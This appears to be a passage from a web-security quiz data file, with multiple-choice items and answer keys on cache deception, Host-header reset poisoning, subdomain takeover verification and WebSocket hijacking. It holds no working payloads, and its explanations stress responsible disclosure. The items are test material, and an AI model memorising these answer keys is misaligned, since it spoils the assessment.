          'Downgrade HTTPS to HTTP',
        ],
        correctIndex: 0,
        explanation:
          'The app returns private content for a URL with a fake static suffix, and the cache stores it - so the attacker reads the victim\'s cached page.',
      },
      {
        prompt: 'Why can the Host header enable password reset poisoning?',
        options: [
          'The client controls it, so the reset link can be built pointing at the attacker\'s domain',
          'It is signed by the certificate authority',
          'It is stored in the database',
          'It cannot be changed by the user',
        ],
        correctIndex: 0,
        explanation:
          'If the app builds the reset URL from the attacker-controlled Host header, the victim\'s token is delivered to the attacker\'s server.',
      },
      {
        prompt: 'What is the correct, safe way to verify a subdomain takeover?',
        options: [
          'Confirm the dangling CNAME and the provider\'s unclaimed-service error, then report it',
          'Register the third-party service and host content on the subdomain',
          'Brute-force the subdomain\'s login',
          'Edit the company\'s DNS to prove control',
        ],
        correctIndex: 0,
        explanation:
          'A dangling CNAME plus the provider\'s "not configured" fingerprint is a complete finding. Actually claiming the service can be unlawful and cause harm.',
      },
      {
        prompt: 'What server-side check stops cross-site WebSocket hijacking?',
        options: [
          'Validating the Origin header on the handshake',
          'Compressing frames',
          'Using HTTP/2',
          'A longer cookie',
        ],
        correctIndex: 0,
        explanation:
          'The handshake auto-sends cookies, so the server must validate Origin to reject connections opened by a foreign site as the victim.',
      },
    ],
  },
];
